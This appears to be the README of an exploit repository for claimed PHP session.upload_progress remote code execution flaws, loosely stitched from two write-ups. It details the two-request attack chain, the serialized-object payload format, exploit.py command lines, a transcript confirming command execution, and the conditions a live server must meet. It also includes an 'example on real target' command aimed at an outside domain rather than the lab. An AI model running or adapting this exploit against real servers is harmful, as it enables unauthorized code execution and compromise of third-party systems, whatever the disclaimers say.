# php2shell — CVE-2026-109618 / CVE-2026-109619 Research

Independent security research on the critical PHP session.upload_progress vulnerabilities (CVSS v4.0 9.2). 
**Date:** 2026-10-21  

## Overview

Two critical pre-auth RCE vulnerabilities in PHP core's `session.upload_progress` handler, affecting PHP 5.4.0 through 8.5.x. This repository contains verification POCs and lab setup for authorized security testing.

### Verified Attack Chains

| Chain | Type | Conditions | Verified |
|-------|------|-----------|----------|
| Session File Injection + LFI | Logic bug | `upload_progress=On` (default) + app LFI | ✅ RCE |
| var_destroy UAF → Handler Overwrite | Memory corruption | `unserialize()` + `/proc/self/mem` | ✅ ASAN + RCE |
| Handler Mismatch → `__destruct` | Deserialization | Cross-dir handler mismatch + POP gadget | ✅ RCE |

### Key Findings

1. **Session fixation** via POST body bypasses `session.use_only_cookies` ([PR #22113](https://github.com/php/php-src/pull/22113))
2. **Unvalidated filename** in upload_progress stored raw in session files
3. **`var_destroy` `__destruct` reentry UAF** — ASAN-confirmed heap-use-after-free
4. **`PS(serializer)` not reset in RSHUTDOWN** — cross-request serializer leak in FPM
5. **`__destruct` fires on decode FAILURE** — object injection via handler mismatch + trailing data

## Repository Structure

```
poc/
  verify_session_injection.py   — Verify filename injection into session files
  verify_uaf_asan.php           — Trigger ASAN heap-use-after-free (var_destroy)
  verify_handler_mismatch.py    — Verify handler mismatch → object deserialization
lab/
  docker-compose.yml            — PHP 8.2.34 FPM + nginx lab environment
  Dockerfile                    — Vulnerable PHP build
  php.ini                       — Lab configuration
  setup.sh                      — One-click lab setup
docs/
  ANALYSIS.md                   — Full technical analysis
```

## Quick Start

```bash
# Start the lab
cd lab && ./setup.sh

# Verify session injection
python3 poc/verify_session_injection.py --target http://127.0.0.1:18080

# Verify UAF (requires ASAN build)
docker exec php-asan-lab php poc/verify_uaf_asan.php

# Verify handler mismatch
python3 poc/verify_handler_mismatch.py --target http://127.0.0.1:18080
```

## Affected Versions

- PHP 5.4.0 — 8.5.11 (all versions with `session.upload_progress`)
- Fixed in: 8.2.35, 8.3.36, 8.4.27, 8.5.12 (scheduled 2026-10-21)
- PHP 5.x, 7.x, 8.0, 8.1: **end-of-life, no official fix**

## Mitigation

```ini
; Immediate mitigation (does NOT fix all attack paths)
session.upload_progress.enabled = Off
session.use_only_cookies = On
```

## Disclaimer

This research is for authorized security testing and educational purposes only. Do not use against systems you do not own or have explicit authorization to test.

## exploit.py

This is another type of exploit.

python3 exploit.py 127.0.0.1 8080 "id; uname -a"
python3 exploit.py 127.0.0.1 8080 "cat /etc/hostname" --sid deadbeef0000000000000000000caf
python3 exploit.py host port "cmd" --gadget Monolog --prop target  # real-target gadget

example on real target: python exploit.py panel.vetergrief.pw 80
"cat /etc/hostname" --sid deadbeef0000000000000000000caf

--

# CVE-2026-109618 / CVE-2026-109619 — PHP session.upload_progress exploit

Unauthenticated RCE in PHP core's `session.upload_progress` handling
(CVSS v4.0 9.2, both CVEs). Fixes shipped 2026-10-21 (8.2.35 / 8.3.36 /
8.4.27 / 8.5.12); every earlier PHP with `session.upload_progress` — 5.4.0
through 8.5.11 — is affected. Mitigation: `session.upload_progress.enabled = Off`.

This project contains a working exploit (`exploit.py`) and a Docker target environment that
reproduces the vulnerable host profile (nginx + php-fpm 8.2.34, per-directory
`session.serialize_handler`).

## The chain (two unauthenticated requests)

```
[1] SEED   POST <php_serialize dir>
          multipart fields: PHPSESSID=<sid>                    (session fixation
                           PHP_SESSION_UPLOAD_PROGRESS=|<serialized payload>  via POST body)
          + one file part
          -> the upload-progress key becomes `upload_progress_|<payload>` and is
             stored verbatim inside the php_serialize session blob.

[2] FIRE   GET <php dir> with Cookie: PHPSESSID=<sid>
          -> the app's session_start() decodes with the default `php` handler,
             which splits the blob at the FIRST `|` (ours) and unserializes the
             payload: object injection. Trailing container data forces a decode
             FAILURE -> var_destroy -> the injected object's __destruct runs
             INSIDE session_start().
```

The exploit injects `O:<Gadget>:1:{<prop>:"<cmd>"}` — any loaded class whose
`__destruct` executes or calls into something with the property you control.
Default gadget: `Logger->cmd` (defined by the target's `api/app.php`, standing in
for real app/preload classes). Payload: ~48 bytes.

## Layout

```
exploit.py          the exploit (stdlib only)
Dockerfile         vulnerable target environment: nginx + php-fpm 8.2.34
nginx-site.conf    target vhost
webroot/app/       seed dir   (.user.ini -> session.serialize_handler=php_serialize)
webroot/api/       fire dir   (.user.ini -> php), Logger gadget class
```

## Usage

```bash
# 1. build & start the target environment
docker build -t cve-2026-109618-exploit .
docker run -d --name cve618 -p 8080:80 cve-2026-109618-exploit

# 2. verify it is up
curl http://127.0.0.1:8080/api/app.php        # -> [api] session started

# 3. exploit
python3 exploit.py 127.0.0.1 8080 "id; uname -a"
python3 exploit.py 127.0.0.1 8080 "cat /etc/hostname" --sid deadbeef0000000000000000000caf
python3 exploit.py host port "cmd" --gadget Monolog --prop target  # real-target gadget
```

Verified transcript against this environment (PHP 8.2.34-fpm):

```
$ python3 exploit.py 127.0.0.1 8080 "id; uname -sr"
[1] seed  POST /app/seed.php -> HTTP 200
[2] fire  GET  /api/app.php -> HTTP 200
[gadget] uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux 7.2.9-...
[+] command output seen — RCE confirmed
```

The command output appears in the trigger response: `__destruct` (and thus
`system()`) runs during `session_start()`'s decode-failure cleanup, before the
script body — followed by the expected
`Failed to decode session object. Session has been destroyed` warning.

## What a real target needs

| Condition | Why |
|---|---|
| `session.upload_progress.enabled=On` (default) | the injection channel |
| `session.upload_progress.cleanup=Off` | keeps the seeded payload on disk (with the default `On` only a race window remains) |
| two reachable dirs with different `session.serialize_handler` (`.user.ini` / `.htaccess`) | write side php_serialize, read side php — the `|` split |
| a class with a useful `__destruct` loaded when `session_start()` runs (app code, `opcache.preload`, `auto_prepend_file`) | the RCE gadget; `--gadget/--prop` to match it |
| `session.use_strict_mode=0` (default) | attacker-chosen session id via the POST `PHPSESSID` field (bypasses `use_only_cookies`) |

Note: the payload must ride the **`PHP_SESSION_UPLOAD_PROGRESS` field value**,
not the uploaded filename — multipart part-header lines are capped at ~5 KB and
truncate larger payloads.

## Disclaimer

For authorized security testing and research only. Run it against your own test
environments or systems you have explicit permission to test.
